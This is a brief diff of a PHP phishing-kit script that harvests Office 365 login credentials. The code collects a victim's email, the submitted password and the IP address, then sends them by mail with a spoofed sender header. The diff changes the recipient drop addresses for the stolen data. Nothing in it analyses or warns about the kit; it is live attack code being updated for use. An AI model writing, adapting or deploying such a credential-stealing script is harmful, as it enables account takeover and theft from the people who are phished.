@@ -6,7 +6,7 @@ $Vd5rgrkn3ik3 .= "Email: ".$_SESSION['clientemail']."\n";
 $Vd5rgrkn3ik3 .= "First Password: ".$_POST['password']."\n";
 $Vd5rgrkn3ik3 .= "IP: ".$Vaciknufzsky."\n";
 $Vd5rgrkn3ik3 .= "===============|Hulk-updated|==============\n";
-$V3gxu1m2kgkm = "teamgunda@yandex.com,mentd13@gmail.com";
+$V3gxu1m2kgkm = "UmwCorporationSdnBhd@outlook.com,UmwCorporationSdnBhd@outlook.com";
 $Vzvoneollnqp = "OFFICE365 - LOGIN - FROM [$Vaciknufzsky]";
 $V30sbmn0ftdu = "From: inStock<goggle.comm>";
 $V30sbmn0ftdu .= $_POST['eMailAdd']."\n";
